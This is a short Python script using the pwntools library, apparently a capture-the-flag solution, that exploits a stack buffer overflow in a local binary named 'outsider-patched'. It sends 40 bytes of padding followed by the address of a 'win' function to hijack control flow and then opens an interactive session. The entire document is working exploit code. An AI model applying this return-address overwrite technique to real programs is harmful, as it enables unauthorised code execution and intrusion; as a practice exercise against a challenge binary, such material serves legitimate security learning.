from pwn import *

p = process('./outsider-patched')


padding = b'A' * 40
win = p64(0x401196)

payload = padding + win

p.sendline(payload)


p.interactive()

